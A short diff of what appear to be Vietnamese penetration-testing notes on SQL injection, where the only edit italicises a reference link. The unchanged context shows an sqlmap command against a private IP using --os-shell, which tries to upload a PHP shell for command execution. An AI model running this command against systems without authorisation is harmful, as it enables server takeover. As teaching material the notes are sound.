@@ -48,4 +48,4 @@ For example, using the OS shell parameter will attempt to automatically upload a
 sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 > PHP 
 
-Tham khảo thêm ở đây: https://miloserdov.org/?p=1320
+*Tham khảo thêm ở đây: https://miloserdov.org/?p=1320
